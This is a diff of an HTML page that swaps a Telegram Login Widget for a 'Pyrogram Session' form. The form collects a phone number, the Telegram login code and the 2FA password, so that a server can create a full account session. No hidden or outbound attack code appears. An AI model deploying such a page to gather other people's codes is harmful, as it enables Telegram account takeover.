@@ -3,135 +3,318 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login with Telegram</title>
+    <title>Pyrogram Session Login</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', system-ui, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            color: #fff;
         }
-        .login-box {
-            background: white;
-            padding: 50px;
+        .container {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            padding: 40px;
             border-radius: 20px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
-            text-align: center;
-            max-width: 400px;
             width: 90%;
-        }
-        .logo {
-            width: 100px;
-            height: 100px;
-            background: linear-gradient(135deg, #0088cc, #00aced);
-            border-radius: 50%;
-            margin: 0 auto 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 50px;
+            max-width: 450px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
         h1 {
-            color: #333;
+            text-align: center;
             margin-bottom: 10px;
-            font-size: 28px;
+            color: #00d4aa;
         }
-        p {
-            color: #666;
+        .subtitle {
+            text-align: center;
+            color: #888;
             margin-bottom: 30px;
-            line-height: 1.6;
+            font-size: 14px;
         }
-        .telegram-btn {
-            display: inline-block;
-            margin-top: 10px;
+        .step {
+            display: none;
         }
-        .info {
-            margin-top: 25px;
+        .step.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
             padding: 15px;
-            background: #f0f9ff;
+            border: 2px solid rgba(255,255,255,0.1);
             border-radius: 10px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #00d4aa;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #00d4aa, #00a884);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0,212,170,0.3);
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .info-box {
+            background: rgba(0,212,170,0.1);
+            border-left: 4px solid #00d4aa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
             font-size: 13px;
-            color: #666;
+            color: #ccc;
+        }
+        .error {
+            background: rgba(255,0,0,0.1);
+            border-left-color: #ff4444;
+            color: #ff8888;
+        }
+        .success {
+            background: rgba(0,255,0,0.1);
+            border-left-color: #00ff88;
+            color: #88ffaa;
         }
         .loading {
             display: none;
-            margin-top: 20px;
+            text-align: center;
+            padding: 20px;
         }
         .loading.active {
             display: block;
         }
         .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0088cc;
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: #00d4aa;
             border-radius: 50%;
-            width: 30px;
-            height: 30px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 15px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-display {
+            text-align: center;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-family: monospace;
+            font-size: 18px;
+            color: #00d4aa;
+        }
+        .resend {
+            text-align: center;
+            margin-top: 15px;
+            color: #888;
+            font-size: 13px;
+        }
+        .resend a {
+            color: #00d4aa;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">✈️</div>
-        <h1>Login with Telegram</h1>
-        <p>Click the button below to authenticate securely with your Telegram account. Your phone number and profile will be automatically fetched.</p>
+    <div class="container">
+        <h1>🚀 Pyrogram Session</h1>
+        <p class="subtitle">Generate Telegram session string</p>
         
-        <!-- Telegram Login Widget -->
-        <script async src="https://telegram.org/js/telegram-widget.js?22" 
-            data-telegram-login="{{ bot_username }}" 
-            data-size="large" 
-            data-onauth="onTelegramAuth(user)" 
-            data-request-access="write">
-        </script>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Verifying...</p>
+        <!-- Step 1: Enter Phone -->
+        <div id="step1" class="step active">
+            <div class="info-box">
+                📱 Enter your phone number with country code. You'll receive a code via Telegram app.
+            </div>
+            
+            <div class="input-group">
+                <label>Session Name (optional)</label>
+                <input type="text" id="sessionName" placeholder="my_session" value="session">
+            </div>
+            
+            <div class="input-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="+91 98765 43210" autocomplete="tel">
+            </div>
+            
+            <button onclick="sendCode()" id="sendBtn">Send Telegram Code</button>
+            
+            <div class="loading" id="loading1">
+                <div class="spinner"></div>
+                <p>Connecting to Telegram...</p>
+            </div>
         </div>
         
-        <div class="info">
-            🔒 Your data is verified directly by Telegram. We never see your password.
+        <!-- Step 2: Enter Code -->
+        <div id="step2" class="step">
+            <div class="info-box success">
+                ✅ Code sent! Check your Telegram app.
+            </div>
+            
+            <div class="phone-display" id="phoneDisplay"></div>
+            
+            <div class="input-group">
+                <label>Telegram Code</label>
+                <input type="text" id="code" placeholder="12345" maxlength="5">
+            </div>
+            
+            <div class="input-group" id="passwordGroup" style="display:none;">
+                <label>2FA Password (if enabled)</label>
+                <input type="password" id="password" placeholder="Your 2FA password">
+            </div>
+            
+            <button onclick="verifyCode()" id="verifyBtn">Verify & Create Session</button>
+            
+            <div class="loading" id="loading2">
+                <div class="spinner"></div>
+                <p>Creating session...</p>
+            </div>
+            
+            <div class="resend">
+                Didn't receive? <a onclick="backToStep1()">Change number</a>
+            </div>
         </div>
+        
+        <div id="message"></div>
     </div>
 
     <script>
-        async function onTelegramAuth(user) {
-            console.log("Telegram auth received:", user);
-            
-            document.getElementById('loading').classList.add('active');
-            
-            try {
-                const response = await fetch('/api/auth/telegram', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(user)
-                });
-                
-                const data = await response.json();
-                
-                if (data.ok) {
-                    window.location.href = '/';
-                } else {
-                    alert('Login failed: ' + (data.error || 'Unknown error'));
-                    document.getElementById('loading').classList.remove('active');
-                }
-            } catch (e) {
-                alert('Network error. Please try again.');
-                document.getElementById('loading').classList.remove('active');
-            }
+        let currentSessionId = null;
+        
+        function showMessage(text, type='info') {
+            const msg = document.getElementById('message');
+            msg.innerHTML = `<div class="info-box ${type}">${text}</div>`;
         }
         
-        // Check if already logged in
-        fetch('/api/user')
-            .then(r => r.json())
-            .then(data => {
-                if (data.ok) window.location.href = '/';
-            });
+        async function sendCode() {
+            const phone = document.getElementById('phone').value.trim();
+            const sessionName = document.getElementById('sessionName').value.trim() || 'session';
+            
+            if (!phone || phone.length < 10) {
+                showMessage('Please enter valid phone number with country code', 'error');
+                return;
+            }
+            
+            document.getElementById('loading1').classList.add('active');
+            document.getElementById('sendBtn').disabled = true;
+            
+            try {
+                const r = await fetch('/api/send-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone, session_name: sessionName})
+                });
+                
+                const data = await r.json();
+                
+                if (data.ok) {
+                    currentSessionId = data.session_id;
+                    document.getElementById('phoneDisplay').textContent = phone;
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                    document.getElementById('code').focus();
+                } else {
+                    showMessage(data.error || 'Failed to send code', 'error');
+                    document.getElementById('sendBtn').disabled = false;
+                }
+            } catch (e) {
+                showMessage('Network error. Try again.', 'error');
+                document.getElementById('sendBtn').disabled = false;
+            }
+            
+            document.getElementById('loading1').classList.remove('active');
+        }
+        
+        async function verifyCode() {
+            const code = document.getElementById('code').value.trim();
+            const password = document.getElementById('password').value;
+            
+            if (!code) {
+                showMessage('Please enter the code', 'error');
+                return;
+            }
+            
+            document.getElementById('loading2').classList.add('active');
+            document.getElementById('verifyBtn').disabled = true;
+            
+            try {
+                const r = await fetch('/api/verify-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        code: code,
+                        password: password || undefined
+                    })
+                });
+                
+                const data = await r.json();
+                
+                if (data.ok) {
+                    window.location.href = '/dashboard';
+                } else if (data.requires_password) {
+                    document.getElementById('passwordGroup').style.display = 'block';
+                    showMessage('This account has 2FA enabled. Enter your password.', 'info');
+                    document.getElementById('verifyBtn').disabled = false;
+                } else {
+                    showMessage(data.error || 'Invalid code', 'error');
+                    document.getElementById('verifyBtn').disabled = false;
+                }
+            } catch (e) {
+                showMessage('Network error. Try again.', 'error');
+                document.getElementById('verifyBtn').disabled = false;
+            }
+            
+            document.getElementById('loading2').classList.remove('active');
+        }
+        
+        function backToStep1() {
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('sendBtn').disabled = false;
+            currentSessionId = null;
+        }
+        
+        // Enter key support
+        document.getElementById('phone')?.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendCode();
+        });
+        document.getElementById('code')?.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') verifyCode();
+        });
     </script>
 </body>
 </html>
